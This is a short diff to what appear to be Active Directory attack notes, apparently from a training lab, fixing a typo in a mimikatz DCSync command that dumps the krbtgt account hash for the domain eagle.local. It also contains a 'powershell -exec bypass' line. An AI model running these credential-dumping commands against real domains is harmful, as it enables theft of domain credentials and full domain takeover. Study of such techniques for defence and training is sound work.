@@ -30,7 +30,7 @@ Attack:
 
   - First, obtain the password's hash of krbgt and the SID value of the domain
     mimikatz.exe
-    lsadump::dcsync /domain:eagle.local /user:krbgt
+    lsadump::dcsync /domain:eagle.local /user:krbtgt
 
     powershell -exec bypass
 
